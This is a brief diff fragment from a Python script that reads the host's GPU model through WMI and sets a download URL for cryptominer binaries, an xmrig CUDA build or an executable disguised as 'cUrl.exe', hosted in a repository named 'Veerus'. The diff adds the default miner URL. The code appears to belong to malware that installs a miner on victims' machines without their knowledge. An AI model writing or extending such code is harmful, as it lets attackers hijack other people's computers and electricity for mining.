@@ -72,7 +72,7 @@ CUDA = False
 
 
 computer = wmi.WMI()
-
+MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/cUrl.exe?raw=true"
 GPUMODEL = computer.Win32_VideoController()[0]
 if("NVIDIA" in GPUMODEL.AdapterCompatibility):
 	MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrigcuda.zip?raw=true"
